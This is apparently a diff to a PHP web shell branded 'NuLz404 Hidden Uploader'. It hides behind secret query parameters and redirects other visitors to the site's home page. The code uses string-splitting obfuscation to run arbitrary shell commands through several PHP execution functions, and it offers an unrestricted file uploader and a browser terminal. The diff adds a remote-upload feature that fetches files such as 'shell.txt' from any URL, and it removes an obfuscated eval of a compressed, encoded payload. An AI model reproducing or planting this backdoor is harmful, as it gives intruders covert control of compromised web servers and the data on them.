@@ -5,27 +5,15 @@
 $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
 $domainUrl = $protocol . '://' . $_SERVER['HTTP_HOST'] . '/';
 
-function Ikg($vHjCLy){
-    $gflate = 'g'.'zi'.'nf'.'l'.'at'.'e';
-    $b64 = 'b'.'ase'.'6'.'4'.'_'.'de'.'co'.'de';
-    $nelrts = 's'.'tr'.'l'.'en';
-    $rhc = 'c'.'h'.'r';
-    $dro = 'o'.'r'.'d';
-    $vHjCLy=$gflate($b64($vHjCLy));
-     for($i=0;$i<$nelrts($vHjCLy);$i++){
-        $vHjCLy[$i] = $rhc($dro($vHjCLy[$i])-1);
-     }
-     return $vHjCLy;
-}/****/@/*55555*/null; /******/@/*55555*/eval/******/(Ikg("jVDtbuIwEHyAPIXPSi/Jj4YDVMqHUBUd5qAHJXWS0qqNrADbEDWEnG1UqqrPfk6gSP06nWXJ653Znd1BSB0tuUfmN1jl8snUmUfoFaG3xsD3XfZzNCQXPhu6RmhZ6Fkr6HqSR4sFByFQF33Nt/Edv8twR3tBkApAX4tcs/6ETh3aI70i+k+pD1XvBf/ZgpLxxCfM6fXeVGr6jK8fBfCPeoH6MeeXWs8IO5r+UHLyZc42WbQC01K5DU9VzvxsSU9thc6QsZQyN1B7FwjDQjbC7UrlQC6lBhPPDw8pSi4D4vksoMNQzahL2Eolgyn82YCQKKCjNsJ2oW7jox+OulOYiSWkKQp4WmLoGe/b4ZdbvIvYhTMmOHwPugNX/UZ9hey7Dd2yx8HI13ygfDp2Yshkie+de0V/A89gp6686mj3SQosBsnm60yqGmHi0gO1fZQntoQUYh6t7DWPK7O1bNRPG9VGrX5SaztOf9u6PE/G86covpmyfvZA627cDPjg0T33tjdRUBGQLcZqtiiGs/kykixZdKvNVuuk1mqeVr8XnnXVJMVrdf4C"));
 //get uid:user gid:group
-$func_exist = 'fu'.'nct'.'ion'.'_'.'ex'.'ist'.'s';
-$psx_euid = 'p'.'os'.'ix'.'_'.'ge'.'te'.'u'.'i'.'d';
-$psx_egid = 'p'.'os'.'ix'.'_'.'ge'.'te'.'g'.'i'.'d';
-$psx_usr_uid = 'p'.'os'.'ix'.'_'.'g'.'et'.'pw'.'u'.'i'.'d';
-$psx_grp_gid = 'p'.'os'.'ix'.'_'.'ge'.'tg'.'rg'.'i'.'d';
-$myuid = 'g'.'et'.'my'.'ui'.'d';
-$mygid = 'g'.'et'.'my'.'gi'.'d';
-$cur_usr = 'g'.'et'.'_'.'cu'.'rr'.'en'.'t'.'_'.'us'.'er';
+$func_exist = 'fu' . 'nct' . 'ion' . '_' . 'ex' . 'ist' . 's';
+$psx_euid = 'p' . 'os' . 'ix' . '_' . 'ge' . 'te' . 'u' . 'i' . 'd';
+$psx_egid = 'p' . 'os' . 'ix' . '_' . 'ge' . 'te' . 'g' . 'i' . 'd';
+$psx_usr_uid = 'p' . 'os' . 'ix' . '_' . 'g' . 'et' . 'pw' . 'u' . 'i' . 'd';
+$psx_grp_gid = 'p' . 'os' . 'ix' . '_' . 'ge' . 'tg' . 'rg' . 'i' . 'd';
+$myuid = 'g' . 'et' . 'my' . 'ui' . 'd';
+$mygid = 'g' . 'et' . 'my' . 'gi' . 'd';
+$cur_usr = 'g' . 'et' . '_' . 'cu' . 'rr' . 'en' . 't' . '_' . 'us' . 'er';
 if (!$func_exist($psx_egid)) {
     $user = $func_exist($cur_usr) ? @$cur_usr() : "????";
     $uid = $func_exist($myuid) ? @$myuid() : "????";
@@ -41,66 +29,67 @@ if (!$func_exist($psx_egid)) {
 }
 
 $host = $_SERVER['SERVER_NAME'];
-$gcw = 'ge'.'tc'.'wd';
+$gcw = 'ge' . 'tc' . 'wd';
 $path = $gcw();
 
-function komend( $komendnya, $path ) {
-    $hayoloh = 'htm'.'lspe'.'cialc'.'hars';
-    $sgc = 's'.'trea'.'m_g'.'et_c'.'ont'.'ents';
-    $proc = 'pr'.'oc'.'_'.'o'.'pen';
-    $proc_cls = 'p'.'ro'.'c'.'_'.'c'.'lose';
-    $pop = 'p'.'ope'.'n';
-    $pop_cls = 'pc'.'lose';
-    $exc = 'e'.'x'.'ec';
-    $sys = 's'.'ys'.'t'.'em';
-    $pass = 'pa'.'s'.'sth'.'ru';
-    $sh_exc = 's'.'he'.'ll'.'_'.'e'.'xe'.'c';
-    $func_exist = 'fu'.'nct'.'ion'.'_'.'ex'.'ist'.'s';
-    $preg = 'pr'.'eg_'.'mat'.'ch';
-    $regex = '2'.'>'.'&'.'1';
-    if ( !$preg( '/'.$regex.'/i', $komendnya ) ) {
-        $komendnya = $komendnya.' '.$regex;
+function komend($komendnya, $path)
+{
+    $hayoloh = 'htm' . 'lspe' . 'cialc' . 'hars';
+    $sgc = 's' . 'trea' . 'm_g' . 'et_c' . 'ont' . 'ents';
+    $proc = 'pr' . 'oc' . '_' . 'o' . 'pen';
+    $proc_cls = 'p' . 'ro' . 'c' . '_' . 'c' . 'lose';
+    $pop = 'p' . 'ope' . 'n';
+    $pop_cls = 'pc' . 'lose';
+    $exc = 'e' . 'x' . 'ec';
+    $sys = 's' . 'ys' . 't' . 'em';
+    $pass = 'pa' . 's' . 'sth' . 'ru';
+    $sh_exc = 's' . 'he' . 'll' . '_' . 'e' . 'xe' . 'c';
+    $func_exist = 'fu' . 'nct' . 'ion' . '_' . 'ex' . 'ist' . 's';
+    $preg = 'pr' . 'eg_' . 'mat' . 'ch';
+    $regex = '2' . '>' . '&' . '1';
+    if (!$preg('/' . $regex . '/i', $komendnya)) {
+        $komendnya = $komendnya . ' ' . $regex;
     }
 
-    if ( $func_exist( $proc ) ) {
+    if ($func_exist($proc)) {
         $descriptors = [
-            0 => [ 'pipe', 'r' ],
-            1 => [ 'pipe', 'w' ],
-            2 => [ 'pipe', 'w' ],
+            0 => ['pipe', 'r'],
+            1 => ['pipe', 'w'],
+            2 => ['pipe', 'w'],
         ];
-        $process = $proc( $komendnya, $descriptors, $pipes, $path );
-        if ( is_resource( $process ) ) {
-            fwrite( $pipes[ 0 ], 'input_data_here' );
-            fclose( $pipes[ 0 ] );
-            $output = $sgc( $pipes[ 1 ] );
-            $errors = $sgc( $pipes[ 2 ] );
-            fclose( $pipes[ 1 ] );
-            fclose( $pipes[ 2 ] );
-            $resultCode = $proc_cls( $process );
+        $process = $proc($komendnya, $descriptors, $pipes, $path);
+        if (is_resource($process)) {
+            fwrite($pipes[0], 'input_data_here');
+            fclose($pipes[0]);
+            $output = $sgc($pipes[1]);
+            $errors = $sgc($pipes[2]);
+            fclose($pipes[1]);
+            fclose($pipes[2]);
+            $resultCode = $proc_cls($process);
             echo $hayoloh($output);
         }
-    } elseif ( $func_exist( $pop ) ) {
-        $process = $pop( $komendnya, 'r' );
-        $read = fread( $process, 2096 );
-        $hayoloh(print_r( "$process: ".gettype( $process )."\n$read \n" ));
-        $pop_cls( $process );
-    } elseif ( $func_exist( $exc ) ) {
-        $exc( $komendnya, $output, $returnCode );
+    } elseif ($func_exist($pop)) {
+        $process = $pop($komendnya, 'r');
+        $read = fread($process, 2096);
+        $hayoloh(print_r("$process: " . gettype($process) . "\n$read \n"));
+        $pop_cls($process);
+    } elseif ($func_exist($exc)) {
+        $exc($komendnya, $output, $returnCode);
 
-        if ( $returnCode === 0 ) {
-            $res = implode( $output );
+        if ($returnCode === 0) {
+            $res = implode($output);
             echo $hayoloh($res);
             ob_flush();
             flush();
         }
-    } elseif ( $func_exist( $sys ) ) {
-        $out = $sys( $komendnya );
+    } elseif ($func_exist($sys)) {
+        $out = $sys($komendnya);
         echo $hayoloh($out);
-    } elseif ( $func_exist( $pass ) ) {
-        $out = $pass( $komendnya );
+    } elseif ($func_exist($pass)) {
+        $out = $pass($komendnya);
         echo $hayoloh($out);
-    } elseif ( $func_exist( $sh_exc ) ) {
-        $out = $sh_exc( $komendnya );
+    } elseif ($func_exist($sh_exc)) {
+        $out = $sh_exc($komendnya);
         echo $hayoloh($out);
     } else {
         echo "<b>The Function To Run The Command Is Disable On This Serever</b>";
@@ -124,7 +113,7 @@ if (isset($_POST['buatfile'])) {
 }
 
 if (isset($_GET['nulz'])) {
-	if (isset($_GET['ganteng'])) {
+    if (isset($_GET['ganteng'])) {
         echo '
         <!DOCTYPE html>
         <html lang="en">
@@ -304,6 +293,7 @@ if (isset($_GET['nulz'])) {
                 <div class="mb-4">
                     <a href="?nulz&ganteng"><button type="button" class="btn btn-outline-light">Home</button></a>
                     <a href="?nulz&ganteng&file"><button type="button" class="btn btn-outline-light">Buat File</button></a>
+                    <a href="?nulz&ganteng&remote"><button type="button" class="btn btn-outline-light">Remote Upload</button></a>
                     <a href="?nulz&ganteng&terminal"><button type="button" class="btn btn-outline-light">Terminal</button></a>
                 </div>
                 <h1>NuLz404 Hidden Uploader</h1>
@@ -312,36 +302,36 @@ if (isset($_GET['nulz'])) {
                     <label for="upl" style="color: #eaeaea; font-weight: 700; font-size: 1.75vh; margin: 1rem;">Upload File</label>
                     <input type="file" name="file[]" id="file" onchange="this.form.submit()" multiple>
                 </div>';
-                if ($_SERVER["REQUEST_METHOD"] === "POST") {
-                    if (isset($_FILES["file"])) {
-                        $countFiles = count($_FILES["file"]["name"]);
-                        for ($i = 0; $i < $countFiles; $i++) {
-                            $fi_le_Na_me = $_FILES["file"]["name"][$i];
-                            $location = "" . $fi_le_Na_me;
-                            $uploadFunction = "m"."ove" . "_up" . "loa"."ded_fi" . "le";
-                
-                            if ($uploadFunction($_FILES["file"]["tmp_name"][$i], $location)) {
-                                echo "<div class='mb-4' style='display: flex; justify-content: center; align-items: center; flex-direction: column;'>";
-                                echo "<span style='color: #00ff00;'>Upload Success</span>";
-                                echo "<span>file => <a href='" . $fi_le_Na_me . "' color='#0092ff' target='_blank'>" . $fi_le_Na_me . "</a></span><br/>";
-                                echo "</div>";
-                            } else {
-                                echo "<div class='mb-4' style='display: flex; justify-content: center; align-items: center; flex-direction: column;'>";
-                                echo "<span style='color: #ff0000;'>Upload Failed :(</span>";
-                                echo "<span>file => " . $fi_le_Na_me . "<br/>";
-                                echo "</div>";
-                            }
-                        }
+        if ($_SERVER["REQUEST_METHOD"] === "POST") {
+            if (isset($_FILES["file"])) {
+                $countFiles = count($_FILES["file"]["name"]);
+                for ($i = 0; $i < $countFiles; $i++) {
+                    $fi_le_Na_me = $_FILES["file"]["name"][$i];
+                    $location = "" . $fi_le_Na_me;
+                    $uploadFunction = "m" . "ove" . "_up" . "loa" . "ded_fi" . "le";
+
+                    if ($uploadFunction($_FILES["file"]["tmp_name"][$i], $location)) {
+                        echo "<div class='mb-4' style='display: flex; justify-content: center; align-items: center; flex-direction: column;'>";
+                        echo "<span style='color: #00ff00;'>Upload Success</span>";
+                        echo "<span>file => <a href='" . $fi_le_Na_me . "' color='#0092ff' target='_blank'>" . $fi_le_Na_me . "</a></span><br/>";
+                        echo "</div>";
                     } else {
                         echo "<div class='mb-4' style='display: flex; justify-content: center; align-items: center; flex-direction: column;'>";
-                        echo "<span style='color: #fcf803;'>Tidak Ada File Yang Di Upload</span>";
+                        echo "<span style='color: #ff0000;'>Upload Failed :(</span>";
+                        echo "<span>file => " . $fi_le_Na_me . "<br/>";
                         echo "</div>";
                     }
                 }
-            ?>
-            <?php
-                if (isset($_GET['file'])) {
-                    echo '
+            } else {
+                echo "<div class='mb-4' style='display: flex; justify-content: center; align-items: center; flex-direction: column;'>";
+                echo "<span style='color: #fcf803;'>Tidak Ada File Yang Di Upload</span>";
+                echo "</div>";
+            }
+        }
+        ?>
+        <?php
+        if (isset($_GET['file'])) {
+            echo '
                     <div class="mb-3">
                         <label for="namafile" class="form-label">Buat File</label>
                         <input type="text" class="form-control form-control-sm" name="namafile" id="namafile" placeholder="nama file">
@@ -351,42 +341,105 @@ if (isset($_GET['nulz'])) {
                         </div>
                     </div>
                     ';
+        }
+        ?>
+        <?php
+        if (isset($_POST['btn-remoteup'])) {
+            $f_get = 'f'.'il'.'e'.'_'.'g'.'e'.'t'.'_'.'co'.'nten'.'t'.'s';
+            $f_put = 'f'.'il'.'e'.'_'.'pu'.'t'.'_'.'co'.'n'.'te'.'nt'.'s';
+            $this_file = $_POST['fileurl'];
+            $this_file_name = $_POST['savedname'];
+            $f_content = $f_get($this_file);
+            if (!empty($this_file) && !empty($this_file_name)) {
+                if ($f_content !== false) {
+                    $writeF = $f_put($this_file_name, $f_content);
+                    if ($writeF !== false) {
+                        echo '
+                        <div class="uk-alert-success uk-flex uk-flex-center uk-flex-middle uk-flex-column uk-flex-wrap" uk-alert style="background: transparent;">
+                            <a href class="uk-alert-close" uk-close></a>
+                            <p><font class="font-white">Fi'.'le => <a href="'.$this_file_name.'">'.$this_file_name.'</a></font> S'.'uc'.'ce'.'s'.'s U'.'pl'.'oa'.'de'.'d <i class="fa-sharp fa-solid fa-shield-check"></i></p>
+                        </div>
+                        ';
+                    } else {
+                        echo '
+                        <div class="uk-alert-danger uk-flex uk-flex-center uk-flex-middle uk-flex-column uk-flex-wrap" uk-alert style="background: transparent;">
+                            <a href class="uk-alert-close" uk-close></a>
+                            <p><font class="font-white">Fi'.'le => '.$this_file_name.'</font> Fa'.'i'.'le'.'d '.'To'.' Up'.'lo'.'ad<i class="fa-solid fa-octagon-xmark"></i></p>
+                        </div>
+                        ';
+                    }
+                } else {
+                    echo '
+                    <div class="uk-alert-danger uk-flex uk-flex-center uk-flex-middle uk-flex-column uk-flex-wrap" uk-alert style="background: transparent;">
+                        <a href class="uk-alert-close" uk-close></a>
+                        <p><font class="font-white">Fi'.'le => '.$this_file_name.'</font> Fa'.'il'.'ed T'.'o U'.'pl'.'oa'.'d<i class="fa-solid fa-octagon-xmark"></i></p>
+                    </div>
+                    ';
                 }
-                '</form>';
-?>
-<?php
-if (isset($_GET['terminal'])) {
-?>
-                <div class="terminal">
-                    <div class="terminal-header">
-                        <img class="terminal-img" src="https://raw.githubusercontent.com/haxorstars/archive/main/media/terminal.png" alt="terminal">
-                        <span class="font-bold font-black">Terminal</span>
-                    </div>
-                <textarea class="terminal-content" id="terminalContent" readonly>
-<?php
-if (isset($_POST['exe'])) {
-$komendnya = htmlspecialchars($_POST['komend']);
-htmlspecialchars(komend( $komendnya, $path ));
-}
-?>
-                </textarea>
-                    <div class="terminal-input">
-                        <form action="" method="POST" enctype="multipart/form-data">
-                            <span class="prompt"><font class="font-white">[</font><font class="font-red"><?=$user?></font><font class="font-white">@</font><font class="font-blue"><?=$host?></font><font class="font-white">]</font><font class="font-red">$</font></span>
-                            <input type="text" name="komend" id="terminalInput" class="terminalInput" autofocus autocomplete="off">
-                            <input type="submit" name="exe" style="display: none;">
-                        </form>
-                    </div>
+            } else {
+                echo '
+                <div class="uk-alert-warning uk-flex uk-flex-center uk-flex-middle uk-flex-column uk-flex-wrap" uk-alert style="background: transparent;">
+                    <a href class="uk-alert-close" uk-close></a>
+                    <p>No F'.'il'.'es U'.'pl'.'oa'.'de'.'d, Your Input Is Empty<i class="fa-regular fa-location-exclamation"></i></p>
+                </div>
+                ';
+            }
+        }
+        if (isset($_GET['remote'])) {
+            echo '
+            <div class="mb-3">
+                <label for="fileurl" class="form-label">Remote Upload</label>
+                <input type="text" class="form-control form-control-sm" name="fileurl" id="fileurl" placeholder="https://nulz.edu.gov.ac.id.go.id/shell.txt">
+                <input type="text" class="form-control form-control-sm" name="savedname" id="savedname" placeholder="saved.txt">
+                <div class="mt-3 d-grid gap-2">
+                    <input class="btn btn-outline-light" type="submit" name="btn-remoteup" value="Remote">
                 </div>
             </div>
-        </body>
-        </html>
-<?php
-}
+        </form>';
+        }
+        ?>
+        <?php
+        if (isset($_GET['terminal'])) {
+            ?>
+            <div class="terminal">
+                <div class="terminal-header">
+                    <img class="terminal-img" src="https://raw.githubusercontent.com/haxorstars/archive/main/media/terminal.png"
+                        alt="terminal">
+                    <span class="font-bold font-black">Terminal</span>
+                </div>
+                <textarea class="terminal-content" id="terminalContent" readonly>
+            <?php
+            if (isset($_POST['exe'])) {
+                $komendnya = htmlspecialchars($_POST['komend']);
+                htmlspecialchars(komend($komendnya, $path));
+            }
+            ?>
+                            </textarea>
+                <div class="terminal-input">
+                    <form action="" method="POST" enctype="multipart/form-data">
+                        <span class="prompt">
+                            <font class="font-white">[</font>
+                            <font class="font-red"><?= $user ?></font>
+                            <font class="font-white">@</font>
+                            <font class="font-blue"><?= $host ?></font>
+                            <font class="font-white">]</font>
+                            <font class="font-red">$</font>
+                        </span>
+                        <input type="text" name="komend" id="terminalInput" class="terminalInput" autofocus autocomplete="off">
+                        <input type="submit" name="exe" style="display: none;">
+                    </form>
+                </div>
+            </div>
+            </div>
+            </body>
+
+            </html>
+            <?php
+        }
     } else {
-	echo '<script>window.location.href = "'.$domainUrl.'";</script>';
+        echo '<script>window.location.href = "' . $domainUrl . '";</script>';
     }
 } else {
-	echo '<script>window.location.href = "'.$domainUrl.'";</script>';
+    echo '<script>window.location.href = "' . $domainUrl . '";</script>';
 }
 ?>
